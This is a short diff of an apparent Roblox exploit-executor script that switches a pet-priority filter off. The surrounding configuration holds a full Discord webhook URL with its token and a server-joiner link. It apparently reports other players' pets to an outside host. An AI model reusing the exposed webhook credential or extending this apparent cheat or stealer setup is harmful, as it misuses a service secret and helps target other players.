@@ -4,7 +4,7 @@ getgenv().decfde = true
 local Webhook = "https://discord.com/api/webhooks/1393571947840929813/Yk-SBXIZoh-FP02pfhIfxthDSYJvUiIxbqugybWYu_gMi0XaccmE3E_1vjcMwZaBpJRM"
 local Username = "drawesfa"
 local Fern = "https://fern.wtf/joiner?placeId="
-local OnlyPriorityPets = true
+local OnlyPriorityPets = false
 local MinPriorityThreshold = 13
 local RS = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
